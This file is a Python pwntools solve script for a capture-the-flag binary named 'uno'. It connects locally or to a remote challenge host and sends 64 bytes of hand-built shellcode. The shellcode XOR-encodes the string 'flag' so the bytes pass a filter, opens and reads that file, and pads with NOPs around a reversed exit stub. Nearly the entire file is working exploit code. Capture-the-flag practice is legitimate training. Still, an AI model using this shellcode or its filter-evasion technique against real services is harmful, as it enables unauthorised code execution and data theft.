#!/usr/bin/env python2

"""
Run exploit locally with:
./solve.py

Run against remote with:
./solve.py REMOTE HOST=challenge.acictf.com PORT=48355
"""

from pwn import *

PROG_PATH = './uno'

SC_LEN = 0x40
BAD_CHARS = '\x00flag\xc2\xc3\xca\xcb'


def init_pwntools_context():
    context.binary = PROG_PATH
    context.terminal = ['tmux', 'vsplit', '-h']

    if not args['REMOTE']:
        context.log_level = 'debug'


def init_io():
    if args['REMOTE']:
        return remote(args['HOST'], int(args['PORT']))
    else:
        pty = process.PTY
        return process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)


def win(io):
    # Set pthread return so that program doesn't think we failed. Assuming
    # rcx != 0 at start of shellcode execution.
    sc_clean_exit_prologue = 'mov [rdi+8],rcx\n'
    sc_clean_exit_epilogue = shellcraft.exit(1)

    # forward
    sc_forward = ''
    # sc_forward += 'int3\n'
    sc_forward += sc_clean_exit_prologue
    sc_forward += 'mov r12,rax\n'
    sc_forward += 'push 0x67616c66 ^ 0x02020202\n'
    sc_forward += 'xor dword ptr [rsp], 0x02020202\n'
    sc_forward += 'mov rdi,rsp\n'
    sc_forward += 'xor edx,edx\n'
    sc_forward += 'xor esi,esi\n'
    sc_forward += 'push SYS_open\n'
    sc_forward += 'pop rax\n'
    sc_forward += 'syscall\n'
    sc_forward += shellcraft.read(0, 'r12', 0x20)
    sc_forward += sc_clean_exit_epilogue

    # reverse
    sc_reverse = ''
    sc_reverse += sc_clean_exit_prologue
    sc_reverse += sc_clean_exit_epilogue

    sc_forward = asm(sc_forward)
    sc_reverse = asm(sc_reverse)[::-1]

    log.info('Length of forward shellcode: %i' % len(sc_forward))
    log.info('Length of reverse shellcode: %i' % len(sc_reverse))
    assert len(sc_forward) + len(sc_reverse) <= SC_LEN

    nop_pad = '\x90' * (SC_LEN - len(sc_forward) - len(sc_reverse))
    payload = sc_forward + nop_pad + sc_reverse

    assert len(payload) == SC_LEN
    assert not any(b in payload for b in BAD_CHARS)

    io.send(payload)
    io.interactive()

    with open('payload.bin', 'wb') as f:
        f.write(payload)


if __name__ == '__main__':
    init_pwntools_context()
    io = init_io()
    win(io)